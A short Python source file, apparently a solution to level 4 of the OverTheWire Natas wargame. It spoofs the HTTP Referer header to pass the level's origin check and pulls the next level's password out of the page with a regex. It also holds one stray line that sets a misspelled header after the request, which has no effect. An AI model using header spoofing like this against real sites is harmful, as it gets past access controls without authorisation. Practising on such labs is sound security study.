import re
from src.natas.base_level import NatasLevel

class Level_04(NatasLevel):

  num = 4
  explanation = "On this level, requests are only accepted if the requests comes\n     from the next level. We use 'Referer' header to bypass this requirement"

  def exploit(self) -> str:

    resp  = self.session.get(self.base_url, headers = {'Referer': 'http://natas5.natas.labs.overthewire.org/'})
    resp.headers.update({'Referrer': f'http://natas5.natas.labs.overthewire.org/'})
    match = re.search(r"natas5 is (\S+)", resp.text)

    return match.group(1)
